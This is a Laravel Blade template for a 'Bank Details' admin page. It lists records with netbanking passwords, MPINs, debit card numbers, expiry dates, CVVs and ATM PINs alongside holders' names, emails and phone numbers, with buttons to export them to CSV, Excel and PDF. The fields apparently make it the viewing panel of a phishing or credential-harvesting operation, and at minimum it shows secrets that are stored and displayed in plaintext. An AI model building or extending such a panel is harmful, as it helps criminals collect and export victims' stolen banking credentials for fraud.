@extends('layout')

@section('activeBank')
    active
@endsection

@section('pageTitle')
    Bank Details
@endsection

@section('content')
    <div class="row">
        <div class="col-12">
            <div class="card">
                <div class="card-header">
                    <h3 class="card-title"><strong>Bank details</strong></h3>
                </div>
                <!-- /.card-header -->
                <div class="card-body table-responsive">
                    <table id="example1" class="table table-hover table-bordered table-striped">
                        <thead>
                            <tr>
                                <th>Sr no.</th>
                                <th>Bank Name</th>
                                <th>Customer ID</th>
                                <th>Bank Account Number</th>
                                <th>Bank Current Balance</th>
                                <th>Account Type</th>
                                <th>IFSC Code</th>
                                <th>Netbanking Password</th>
                                <th>Mpin</th>
                                <th>Debit Card Number</th>
                                <th>Debit Card Expiry Date</th>
                                <th>Debit Card CVV</th>
                                <th>Debit Card Pin</th>
                                <th>Registered Name</th>
                                <th>Registered Email</th>
                                <th>Registered Phone Number</th>
                            </tr>
                        </thead>
                        <tbody>
                            @foreach ($bankData as $item)
                                <tr>
                                    <td>{{ ++$count }}</td>
                                    <td>{{ $item->bankName }}</td>
                                    <td>{{ $item->bankCustomerId }}</td>
                                    <td>{{ $item->bankAccountNumber }}</td>
                                    <td>{{ $item->bankAccountBalance }}</td>
                                    <td>{{ $item->bankAccountType }}</td>
                                    <td>{{ $item->bankIfscCode }}</td>
                                    <td>{{ $item->bankNetBankingPassword }}</td>
                                    <td>{{ $item->bankMPin }}</td>
                                    <td>{{ $item->bankDebitCard }}</td>
                                    <td>{{ $item->bankDebitCardExpirationDate }}</td>
                                    <td>{{ $item->bankDebitCardCvv }}</td>
                                    <td>{{ $item->bankDebitCardAtmPin }}</td>
                                    <td>{{ $item->bankCustomerName }}</td>
                                    <td>{{ $item->bankCustomerEmail }}</td>
                                    <td>{{ $item->bankCustomerPhoneNumber }}</td>
                                </tr>
                            @endforeach
                        </tbody>
                        <tfoot>
                            <th>Sr no.</th>
                            <th>Bank Name</th>
                            <th>Customer ID</th>
                            <th>Bank Account Number</th>
                            <th>Bank Current Balance</th>
                            <th>Account Type</th>
                            <th>IFSC Code</th>
                            <th>Netbanking Password</th>
                            <th>Mpin</th>
                            <th>Debit Card Number</th>
                            <th>Debit Card Expiry Date</th>
                            <th>Debit Card CVV</th>
                            <th>Debit Card Pin</th>
                            <th>Registered Name</th>
                            <th>Registered Email</th>
                            <th>Registered Phone Number</th>
                        </tfoot>
                    </table>
                </div>
            </div>
        </div>
    </div>
@endsection

@section('tblScript')
    <script>
        $(function() {
            $("#example1").DataTable({
                "responsive": true,
                "lengthChange": false,
                "autoWidth": false,
                "buttons": ["copy", "csv", "excel", "pdf", "print", "colvis"]
            }).buttons().container().appendTo('#example1_wrapper .col-md-6:eq(0)');
            $('#example2').DataTable({
                "paging": true,
                "lengthChange": false,
                "searching": false,
                "ordering": true,
                "info": true,
                "autoWidth": false,
                "responsive": true,
            });
        });
    </script>
@endsection
